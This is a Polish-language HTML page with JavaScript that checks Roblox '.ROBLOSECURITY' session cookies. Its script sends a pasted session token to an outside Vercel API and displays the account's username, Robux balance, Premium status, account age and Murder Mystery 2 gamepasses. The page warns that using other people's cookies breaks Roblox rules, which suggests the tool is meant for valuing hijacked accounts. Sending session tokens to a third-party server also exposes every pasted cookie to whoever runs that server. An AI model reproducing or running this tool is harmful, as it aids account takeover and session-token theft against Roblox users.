<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox – dane z .ROBLOSECURITY</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 600px;
      margin: 40px auto;
      padding: 20px;
      background: #111;
      color: #eee;
    }
    textarea {
      width: 100%;
      height: 140px;
      background: #222;
      color: #eee;
      border: 1px solid #444;
      padding: 12px;
      font-family: monospace;
      resize: vertical;
    }
    button {
      padding: 14px 32px;
      background: #1e90ff;
      border: none;
      color: white;
      font-size: 17px;
      cursor: pointer;
      margin: 15px 0;
      border-radius: 4px;
    }
    button:hover {
      background: #0c7ae6;
    }
    #result {
      margin-top: 25px;
      padding: 20px;
      background: #1a1a1a;
      border: 1px solid #444;
      border-radius: 8px;
      min-height: 160px;
      line-height: 1.6;
    }
    .error { color: #ff4d4d; }
    .success { color: #00ff9d; }
    b { color: #ddd; }
    small { color: #aaa; }
    #avatar {
      max-width: 100%;
      height: auto;
      border-radius: 12px;
      margin: 15px 0;
      border: 2px solid #444;
      display: block;
    }
  </style>
</head>
<body>

<h2>Pobierz dane konta Roblox z cookie .ROBLOSECURITY</h2>

<p style="color:#ffcc00; font-weight:bold;">
  <strong>OSTRZEŻENIE:</strong> używanie cudzych cookie jest niezgodne z regulaminem Roblox i może skutkować permanentnym banem konta
</p>

<textarea id="cookie" placeholder="Wklej tutaj wartość .ROBLOSECURITY (bez '.ROBLOSECURITY=')"></textarea>

<br>
<button onclick="sprawdz()">Sprawdź konto</button>

<div id="result"></div>

<script>
async function sprawdz() {
  const cookieVal = document.getElementById('cookie').value.trim();
  const result = document.getElementById('result');
  result.innerHTML = '';

  if (cookieVal.length < 200) {
    result.innerHTML = '<span class="error">Cookie wygląda na za krótkie / nieprawidłowe</span>';
    return;
  }

  result.innerHTML = '<i>Trwa sprawdzanie... proszę czekać</i>';

  try {
    const resp = await fetch('https://checker-alpha-pink.vercel.app/api/get-username', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie: cookieVal })
    });

    const json = await resp.json();

    if (json.error) {
      result.innerHTML = `<span class="error">Błąd: ${json.error}</span>`;
      return;
    }

    if (json.success) {
      const creationDate = json.created !== 'nie udało się pobrać'
        ? new Date(json.created).toLocaleDateString('pl-PL', { day: '2-digit', month: '2-digit', year: 'numeric' })
        : '—';

      let avatarHtml = '';
      if (json.avatarUrl) {
        avatarHtml = `<img id="avatar" src="${json.avatarUrl}" alt="Avatar użytkownika ${json.username}" onerror="this.src='https://via.placeholder.com/720?text=Brak+avatara';">`;
      } else {
        avatarHtml = '<p style="color:#ffcc00;">Nie udało się pobrać avatara</p>';
      }

      let gamepassesHtml = '';
      if (json.mm2GamepassesCount > 0) {
        gamepassesHtml = `
          <b>Gamepassy w Murder Mystery 2 (Radio / Elite):</b> 
          <span style="color: #00ff9d; font-weight: bold;">TAK – ${json.mm2GamepassesCount} szt.</span><br>
          <small>(sprawdzono ID: Radio i Elite)</small><br>
        `;
      } else {
        gamepassesHtml = `
          <b>Gamepassy w Murder Mystery 2 (Radio / Elite):</b> 
          <span style="color: #ff4d4d; font-weight: bold;">NIE ✗</span><br>
          <small>(brak Radio ID 1308795 lub Elite ID 429957)</small><br>
        `;
      }

      result.innerHTML = `
        <span class="success">Pomyślnie zweryfikowano!</span><br><br>

        ${avatarHtml}

        <b>Nazwa użytkownika:</b> ${json.username}<br>
        <b>Display Name:</b> ${json.displayName}<br>
        <b>User ID:</b> ${json.userId}<br>

        <b>Roblox Premium:</b>
          <span style="color: ${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">
            ${json.hasPremium ? 'TAK ✓' : 'NIE ✗'}
          </span><br>

        <b>Robux na koncie:</b>
          <span style="color: #ffcc00; font-weight: bold;">
            ${json.robux.toLocaleString('pl-PL')} Robux
          </span><br>

        <b>Wiek konta:</b>
          <span style="color: #ffcc00; font-weight: bold;">
            ${json.accountAgeDays} dni
          </span><br>

        <b>Data założenia:</b> ${creationDate}
        ${json.created !== 'nie udało się pobrać' ? `<small> (${json.created.split('T')[0]})</small>` : ''}<br>

        ${gamepassesHtml}
      `;
    } else {
      result.innerHTML = '<span class="error">Nieznany format odpowiedzi serwera</span>';
    }
  } catch (e) {
    result.innerHTML = `<span class="error">Błąd połączenia: ${e.message}</span>`;
  }
}
</script>

</body>
</html>
